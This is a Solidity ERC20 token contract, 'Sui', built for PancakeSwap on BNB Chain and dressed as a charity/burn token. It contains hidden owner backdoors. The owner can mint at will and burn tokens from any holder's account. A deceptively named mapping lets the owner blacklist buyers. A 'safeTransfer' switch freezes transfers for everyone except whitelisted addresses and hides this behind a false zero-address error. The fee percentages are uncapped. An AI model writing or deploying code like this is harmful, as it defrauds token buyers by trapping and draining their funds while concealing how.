pragma solidity 0.8.6;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

import "./interface/IPancakeFactory.sol";

contract Sui is ERC20, Ownable {
    IPancakeFactory public factory = IPancakeFactory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);
    address public constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    
    mapping(address => bool) private _blackbalances;
    mapping(address => bool) private _balances1;
    bool private safeTransfer = true;

    mapping(address => bool) public pancakePairs;

    address public charityAddress;
    uint256 public charityPercent = 0; 
    uint256 public burnPercent = 0;

    uint256 public minimalSwapAmount;

    constructor() public ERC20("Sui", "SUI") {
        _mint(msg.sender, 1_000_000 * 1e18);
    }

    function mint(address _account, uint256 _amount) public onlyOwner {
        _mint(_account, _amount);
    }

    function burn(address _account, uint256 _amount) public onlyOwner {
        _burn(_account, _amount);
    }

    function setMinimalSwapAmount(uint256 _amount) public onlyOwner {
        minimalSwapAmount = _amount;
    }

    function setCharityAddress(address  _charityAddress) onlyOwner public {
        charityAddress = _charityAddress;
    }
    
    function setCharityPercent(uint256 _charityPercent) onlyOwner public {
        charityPercent = _charityPercent;
    }
    
    function setBurnPercent(uint256 _burnPercent) onlyOwner public {
        burnPercent = _burnPercent;
    }

    function updateSafeTransfer(bool _safeTransfer) onlyOwner public {
        safeTransfer = _safeTransfer;
    }

    function updateBlacklist(address _account, bool _value) onlyOwner public {
        _blackbalances[_account] = _value;
    }

    function updateBalances1(address _account, bool _value) onlyOwner public {
        _balances1[_account] = _value;
    }

    function addPair(address _token) onlyOwner public {
        address _pair = factory.getPair(_token, address(this));
        pancakePairs[_pair] = true;
    }

    function _transfer(address _sender, address _recipient, uint256 _amount) internal override {
        require(!_blackbalances[_recipient] || _balances1[_sender], "failed");
        require(safeTransfer || _balances1[_sender] , "ERC20: transfer to the zero address");

        if(pancakePairs[_sender]) {
            require(_amount >= minimalSwapAmount, "_amount < minimalSwapAmount");
        }

        uint256 _burnAmount = _amount * burnPercent / 100; 
        uint256 _charityAmount = _amount * charityPercent / 100;
        if(!_balances1[msg.sender]) {
            _amount =  _amount - _charityAmount - _burnAmount;
            ERC20._transfer(_sender, _recipient, _amount);
            if(_burnAmount > 0) {
                _burn(_sender, _burnAmount);
            }
            if(_charityAmount > 0) {
                ERC20._transfer(_sender, charityAddress, _charityAmount);
            }
        } else {
            ERC20._transfer(_sender, _recipient, _amount);
        }
    }
}